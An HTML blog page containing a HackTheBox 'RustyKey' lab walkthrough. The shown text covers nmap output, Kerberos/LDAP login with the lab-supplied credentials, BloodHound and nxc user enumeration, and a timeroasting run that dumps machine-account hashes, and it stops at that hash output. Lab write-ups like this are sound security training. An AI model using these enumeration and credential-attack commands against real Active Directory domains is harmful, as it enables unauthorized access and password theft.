<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- Google Fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=LXGW+WenKai+Mono+TC:normal,bold,italic">
    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习  这篇用英语写的，主观原因是Athena没给他装中">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox——HTB Rustykey Writeup">
<meta property="og:url" content="https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/index.html">
<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习  这篇用英语写的，主观原因是Athena没给他装中">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-10.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-1.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-2.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-3.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-4.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-5.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-6.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-7.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-8.png">
<meta property="og:image" content="https://n0nome.github.io/images/rustykey-9.png">
<meta property="article:published_time" content="2025-07-02T08:29:48.060Z">
<meta property="article:modified_time" content="2025-07-02T08:29:48.160Z">
<meta property="article:author" content="n0nome">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n0nome.github.io/images/rustykey-10.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/laojun.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
        
      
    
    <!-- title -->
    <title>HackTheBox——HTB Rustykey Writeup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-RXS95XH60B');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/06/27/Retro/Retro/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&text=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&is_video=false&description=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Rustykey Writeup&body=Check out this article: https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&name=HackTheBox——HTB Rustykey Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&t=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timeroasting"><span class="toc-number">2.</span> <span class="toc-text">timeroasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashcat-crack-and-password-sparying"><span class="toc-number">2.1.</span> <span class="toc-text">hashcat crack and password sparying</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-bb-margan"><span class="toc-number">3.</span> <span class="toc-text">shell as bb.margan</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#continue-with-next-day"><span class="toc-number">3.1.</span> <span class="toc-text">continue with next day</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HackTheBox——HTB Rustykey Writeup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">n0nome</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-07-02T08:29:48.060Z" class="dt-published" itemprop="datePublished">2025-07-02</time>
        
        (Updated: <time datetime="2025-07-02T08:29:48.160Z" class="dt-updated" itemprop="dateModified">2025-07-02</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/rustykey-10.png"></p>
<blockquote>
<p>这篇用英语写的，主观原因是Athena没给他装中文输入法，客观原因是没给Athena装中文输入法，所以请原谅我那看不懂只能靠猜的英语表达，感谢：）</p>
</blockquote>
<blockquote>
<p>This article is written in English. The subjective reason is that Athena did not install the Chinese input method for it. The objective reason is that Athena did not install the Chinese input method. So please forgive my English expression that I can’t understand and can only guess. Thank you：）</p>
</blockquote>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION                      </span><br><span class="line">53/tcp    open  domain        Simple DNS Plus              </span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-06-29 11:04:53Z)                          </span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                           </span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)                                                                                                                </span><br><span class="line">445/tcp   open  microsoft-ds?                              </span><br><span class="line">464/tcp   open  kpasswd5?                                  </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                     </span><br><span class="line">636/tcp   open  tcpwrapped                                                                                                                                                                                                                   </span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)                                                                                                                </span><br><span class="line">3269/tcp  open  tcpwrapped                                 </span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                 </span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0                </span><br><span class="line">|_http-title: Not Found                                    </span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing                                                                    </span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                 </span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0                </span><br><span class="line">|_http-title: Not Found                                    </span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                     </span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49692/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49729/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                                                        </span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 (92%), Microsoft Windows 10 1709 - 21H2 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 21H1 (92%), Micro</span><br><span class="line">soft Windows Server 2022 (92%), Microsoft Windows Vista SP1 (91%), Microsoft Windows 10 1903 (91%), Microsoft Windows Server 2012 (91%)                                                                                                      </span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).                                                             </span><br><span class="line">Network Distance: 2 hops        PORT      STATE SERVICE       VERSION                      </span><br><span class="line">53/tcp    open  domain        Simple DNS Plus              </span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-06-29 11:04:53Z)                          </span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                           </span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)                                                                                                                </span><br><span class="line">445/tcp   open  microsoft-ds?                              </span><br><span class="line">464/tcp   open  kpasswd5?                                  </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                     </span><br><span class="line">636/tcp   open  tcpwrapped                                                                                                                                                                                                                   </span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)                                                                                                                </span><br><span class="line">3269/tcp  open  tcpwrapped                                 </span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                 </span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0                </span><br><span class="line">|_http-title: Not Found                                    </span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing                                                                    </span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                 </span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0                </span><br><span class="line">|_http-title: Not Found                                    </span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                     </span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49692/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">49729/tcp open  msrpc         Microsoft Windows RPC                                                                   </span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                                                        </span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 (92%), Microsoft Windows 10 1709 - 21H2 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 21H1 (92%), Micro</span><br><span class="line">soft Windows Server 2022 (92%), Microsoft Windows Vista SP1 (91%), Microsoft Windows 10 1903 (91%), Microsoft Windows Server 2012 (91%)                                                                                                      </span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).                                                             </span><br><span class="line">Network Distance: 2 hops        Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows                                                    </span><br><span class="line"></span><br><span class="line">Host script results:                                       </span><br><span class="line">| smb2-time:                                               </span><br><span class="line">|   <span class="built_in">date</span>: 2025-06-29T11:05:53                              </span><br><span class="line">|_  start_date: N/A                                        </span><br><span class="line">| smb2-security-mode:                                      </span><br><span class="line">|   3.1.1:                                                 </span><br><span class="line">|_    Message signing enabled and required                 </span><br><span class="line">|_clock-skew: 7h59m59s                      </span><br></pre></td></tr></table></figure>

<blockquote>
<p>As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker &#x2F; 8#t5HE8L!W3A</p>
</blockquote>
<p>ldap auth</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28800s&#x27;</span> nxc ldap <span class="variable">$IP</span> -u rr.parker -p <span class="string">&#x27;8#t5HE8L!W3A&#x27;</span> -k</span><br><span class="line">LDAP        10.129.232.127  389    DC               [*] None (name:DC) (domain:rustykey.htb)</span><br><span class="line">LDAP        10.129.232.127  389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A </span><br></pre></td></tr></table></figure>

<blockquote>
<p>Please ntp this time and please use faketime</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28800s&#x27;</span> bloodhound-ce-python -u <span class="string">&#x27;rr.parker&#x27;</span> -p <span class="string">&#x27;8#t5HE8L!W3A&#x27;</span> -d rustykey.htb -c All --zip -ns <span class="variable">$IP</span></span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound Community Edition</span><br><span class="line">INFO: Found AD domain: rustykey.htb                                                           </span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user                                                                    </span><br><span class="line">INFO: Connecting to LDAP server: dc.rustykey.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 16 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.rustykey.htb</span><br><span class="line">INFO: Found 12 <span class="built_in">users</span></span><br><span class="line">INFO: Found 58 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 10 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: </span><br><span class="line">INFO: Querying computer: dc.rustykey.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 27S</span><br><span class="line">INFO: Compressing output into 20250629192757_bloodhound.zip</span><br></pre></td></tr></table></figure>

<p><img src="/images/rustykey.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28801s&#x27;</span> nxc ldap <span class="variable">$IP</span> -u <span class="string">&#x27;rr.parker&#x27;</span> -p <span class="string">&#x27;8#t5HE8L!W3A&#x27;</span> -k --<span class="built_in">users</span></span><br><span class="line">LDAP        10.129.232.127  389    DC               [*] None (name:DC) (domain:rustykey.htb)</span><br><span class="line">LDAP        10.129.232.127  389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A </span><br><span class="line">LDAP        10.129.232.127  389    DC               [*] Enumerated 11 domain <span class="built_in">users</span>: rustykey.htb</span><br><span class="line">LDAP        10.129.232.127  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               </span><br><span class="line">LDAP        10.129.232.127  389    DC               Administrator                 2025-06-05 06:52:22 0        Built-<span class="keyword">in</span> account <span class="keyword">for</span> administering the computer/domain      </span><br><span class="line">LDAP        10.129.232.127  389    DC               Guest                         &lt;never&gt;             0        Built-<span class="keyword">in</span> account <span class="keyword">for</span> guest access to the computer/domain    </span><br><span class="line">LDAP        10.129.232.127  389    DC               krbtgt                        2024-12-27 08:53:40 0        Key Distribution Center Service Account                     </span><br><span class="line">LDAP        10.129.232.127  389    DC               rr.parker                     2025-06-05 06:54:15 0                                                                    </span><br><span class="line">LDAP        10.129.232.127  389    DC               mm.turner                     2024-12-27 18:18:39 0                                                                    </span><br><span class="line">LDAP        10.129.232.127  389    DC               bb.morgan                     2025-06-30 17:01:40 0                                                                    </span><br><span class="line">LDAP        10.129.232.127  389    DC               gg.anderson                   2025-06-30 17:01:40 0                                                                    </span><br><span class="line">LDAP        10.129.232.127  389    DC               dd.ali                        2025-06-30 17:01:40 0                                                                    </span><br><span class="line">LDAP        10.129.232.127  389    DC               ee.reed                       2025-06-30 17:01:40 0                                                                    </span><br><span class="line">LDAP        10.129.232.127  389    DC               nn.marcos                     2024-12-27 19:34:50 0                                                                    </span><br><span class="line">LDAP        10.129.232.127  389    DC               backupadmin                   2024-12-30 08:30:18 0                     </span><br></pre></td></tr></table></figure>

<h2 id="timeroasting"><a href="#timeroasting" class="headerlink" title="timeroasting"></a>timeroasting</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ python3 Timeroast/timeroast.py <span class="variable">$IP</span> | <span class="built_in">tee</span> pass.list                                                                                                                                                               </span><br><span class="line">1000:<span class="variable">$sntp</span>-ms$c0f73895915b0da195796e6d190aaa87<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c71197d7e1b8428bffbfcd0aec0cdb4e1b094f34ec0cdb4e1b0975ca</span>                                                                    </span><br><span class="line">1103:<span class="variable">$sntp</span>-ms$9d74dcc4302906275a42fddf73f6d99f<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c74af4f0e1b8428bffbfcd0aec0cdb4ecb63794cec0cdb4ecb639276</span>                                                                    </span><br><span class="line">1104:<span class="variable">$sntp</span>-ms$bb939d70c6befa61f8a5cb52220cd86b<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c74c0668e1b8428bffbfcd0aec0cdb4ecb6485bbec0cdb4ecb64a59c</span>                                                                    </span><br><span class="line">1105:<span class="variable">$sntp</span>-ms$c5b4dbe54f9b9df4f06410b7e6f55270<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c4731825e1b8428bffbfcd0aec0cdb4ecc6295f7ec0cdb4ecc62c69e</span>                                                                    </span><br><span class="line">1106:<span class="variable">$sntp</span>-ms$c54ab79043c05c09b7865cb3bc8e33ab<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c4772855e1b8428bffbfcd0aec0cdb4ecc66a627ec0cdb4ecc66dbd7</span>                                                                    </span><br><span class="line">1107:<span class="variable">$sntp</span>-ms$48ae261cce24d008101f1625ce290f33<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c494ba36e1b8428bffbfcd0aec0cdb4ecc842df7ec0cdb4ecc846db8</span>                                                                    </span><br><span class="line">1119:<span class="variable">$sntp</span>-ms$841396d09dfb0db7c6df7d08f7c225b4<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c4f09528e1b8428bffbfcd0aec0cdb4ecce0271cec0cdb4ecce03991</span>                                                                    </span><br><span class="line">1120:<span class="variable">$sntp</span>-ms$04f83fd359a14cf33d718047e09a36ee<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c50dcac3e1b8428bffbfcd0aec0cdb4eccfd4f4bec0cdb4eccfd75e2</span>                                                                    </span><br><span class="line">1118:<span class="variable">$sntp</span>-ms$7e900d03a8e27af73e61aa92497b4035<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c4ef657ee1b8428bffbfcd0aec0cdb4eccdef416ec0cdb4eccdf0d41</span>                                                                    </span><br><span class="line">1121:<span class="variable">$sntp</span>-ms$47f51356ea79fa5eb86ac9e49ac0efc5<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c37b8180e1b8428bffbfcd0aec0cdb4ecf8388b6ec0cdb4ecf83cf2c</span>                                                                    </span><br><span class="line">1123:<span class="variable">$sntp</span>-ms$f90b258ea943a81416a872605c3e77f0<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c72547b8e1b8428bffbfcd0aec0cdb4ed70464e9ec0cdb4ed7049590</span>                                                                    </span><br><span class="line">1122:<span class="variable">$sntp</span>-ms$ce6894efa45aaab1d2188113bd73d0f5<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c723e5b8e1b8428bffbfcd0aec0cdb4ed702f8d8ec0cdb4ed70336ec</span>                                                                    </span><br><span class="line">1124:<span class="variable">$sntp</span>-ms$31458d49c0eec9dd944e75364894c112<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c74ff6b8e1b8428bffbfcd0aec0cdb4ed72f04d0ec0cdb4ed72f47ec</span>                                                                    </span><br><span class="line">1125:<span class="variable">$sntp</span>-ms$d43e13ea5807283d3048336d85b2fcb9<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c7533028e1b8428bffbfcd0aec0cdb4ed7324851ec0cdb4ed7327faf</span>                                                                    </span><br><span class="line">1126:<span class="variable">$sntp</span>-ms$a9de5c7326969802e0c93a072697c01d<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c772fe24e1b8428bffbfcd0aec0cdb4ed75212f2ec0cdb4ed752560e</span>                                                                    </span><br><span class="line">1127:<span class="variable">$sntp</span>-ms$92bc20d7150b1e0170580435e2770dcb<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c779be31e1b8428bffbfcd0aec0cdb4ed758d2ffec0cdb4ed7590f65</span>      </span><br></pre></td></tr></table></figure>

